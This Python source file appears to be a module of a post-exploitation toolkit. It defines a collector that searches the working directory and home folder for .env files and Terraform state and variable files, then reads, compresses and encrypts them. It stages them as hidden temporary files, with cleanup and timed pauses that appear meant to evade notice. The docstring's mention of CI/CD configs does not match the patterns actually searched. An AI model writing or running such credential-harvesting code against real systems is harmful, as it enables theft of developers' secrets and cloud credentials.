from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class DevArtifactsCollector(BaseCollector):
    """
    Collect IaC and CI/CD artifacts.

    Targets:
      - .env files
      - terraform.tfstate
      - terraform.tfvars
      - CI/CD config files (GitHub Actions, GitLab CI, etc.)
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        # Search for .env files in common project root candidates
        search_roots = [Path.cwd(), Path.home()]
        patterns = [
            ".env",
            ".env.local",
            ".env.production",
            "terraform.tfstate",
            "terraform.tfvars",
        ]

        for root in search_roots:
            for p in patterns:
                for match in root.rglob(p):
                    # Limit depth for discovery to avoid huge scans
                    if len(match.parts) - len(root.parts) > 3:
                        continue

                    yield ArtifactMetadata(
                        artifact_family="dev_artifacts",
                        artifact_subtype=match.name.strip("."),
                        source_path=str(match),
                        source_platform=os.name,
                        collection_method="file_read",
                    )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "dev"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Dev artifact collection error (%s): %s", artifact.source_path, exc)
        return None
